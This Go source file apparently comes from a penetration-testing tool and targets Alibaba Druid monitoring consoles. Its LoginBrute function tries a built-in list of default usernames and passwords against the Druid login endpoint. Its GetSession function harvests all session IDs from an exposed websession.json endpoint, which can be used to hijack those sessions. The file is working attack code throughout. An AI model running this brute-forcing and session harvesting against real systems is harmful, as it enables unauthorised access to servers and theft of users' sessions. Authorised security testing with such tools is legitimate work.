package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"slack-wails/lib/clients"
	"strings"
)

type DruidWebsession struct {
	ResultCode int `json:"ResultCode"`
	Content    []struct {
		Sessionid              string      `json:"SESSIONID"`
		Principal              interface{} `json:"Principal"`
		RunningCount           int         `json:"RunningCount"`
		ConcurrentMax          int         `json:"ConcurrentMax"`
		RequestCount           int         `json:"RequestCount"`
		RequestTimeMillisTotal int         `json:"RequestTimeMillisTotal"`
		CreateTime             string      `json:"CreateTime"`
		LastAccessTime         string      `json:"LastAccessTime"`
		RemoteAddress          string      `json:"RemoteAddress"`
		JdbcCommitCount        int         `json:"JdbcCommitCount"`
		JdbcRollbackCount      int         `json:"JdbcRollbackCount"`
		JdbcExecuteCount       int         `json:"JdbcExecuteCount"`
		JdbcExecuteTimeMillis  int         `json:"JdbcExecuteTimeMillis"`
		JdbcFetchRowCount      int         `json:"JdbcFetchRowCount"`
		JdbcUpdateCount        int         `json:"JdbcUpdateCount"`
		UserAgent              string      `json:"UserAgent"`
		RequestInterval        []int       `json:"RequestInterval"`
	} `json:"Content"`
}

type Druid struct{}

const (
	Login   = 1
	Seesion = 2
)

const uri = "/druid/websession.json?orderBy=&orderType=asc&page=1&perPageCount=1000000"

func NewDruid() *Druid {
	return &Druid{}
}

var uname = []string{"admin", "druid", "ruoyi"}
var passwd = []string{"admin", "druid", "123456"}

func (d *Druid) LoginBrute(target string, client *http.Client) ([]string, error) {
	for _, name := range uname {
		for _, pass := range passwd {
			loginParames := fmt.Sprintf("loginUsername=%s&loginPassword=%s", name, pass)
			resp, body, err := clients.NewRequest("POST", target+"/druid/submitLogin", nil, strings.NewReader(loginParames), 10, true, client)
			if err != nil {
				return []string{"请求失败: " + target}, err
			}
			if resp.StatusCode == 200 && !bytes.Contains(body, []byte("error")) {
				return []string{"爆破成功: ", name, pass}, nil
			}
		}
	}
	return []string{"爆破失败: " + target}, nil
}

func (d *Druid) GetSession(target string, client *http.Client) (result []string, err error) {
	var dw DruidWebsession
	_, body, err := clients.NewSimpleGetRequest(target+uri, client)
	if err != nil {
		return nil, err
	}
	if err := json.Unmarshal(body, &dw); err != nil {
		return nil, err
	}
	for _, v := range dw.Content {
		result = append(result, v.Sessionid)
	}
	return result, nil
}
